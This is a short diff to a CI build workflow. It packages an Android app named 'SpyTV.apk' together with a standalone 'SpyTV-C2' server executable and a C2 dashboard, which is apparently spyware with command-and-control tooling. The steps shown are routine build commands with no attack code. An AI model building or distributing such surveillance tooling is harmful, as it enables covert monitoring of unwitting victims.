@@ -45,16 +45,24 @@ jobs:
           cmake: false
           ndk-api: 24
 
+      - name: Copy dashboard assets
+        run: |
+          mkdir -p android/app/src/main/assets
+          cp c2_dashboard.html android/app/src/main/assets/
+
       - name: Build APK
         run: |
           chmod +x android/gradlew
           cd android
           ./gradlew assembleDebug --no-daemon --console=plain
+          cp app/build/outputs/apk/debug/app-debug.apk ../SpyTV.apk
 
       - name: Build Python C2 EXE (standalone)
         run: |
           # PyInstaller is used to create a standalone Windows EXE
           pip install pyinstaller
+          # On Linux, use --target-arch x86_64 and WINE if cross-compiling,
+          # or build the Python server package for the current platform
           pyinstaller --onefile --name "SpyTV-C2-standalone" \
             --add-data "c2_dashboard.html:." \
             --add-data "c2_data:c2_data" \
@@ -84,7 +92,7 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: spytv-exe
-          path: dist/SpyTV-C2-standalone
+          path: dist/SpyTV-C2-standalone*
           if-no-files-found: error
 
       - name: Upload checksums artifact
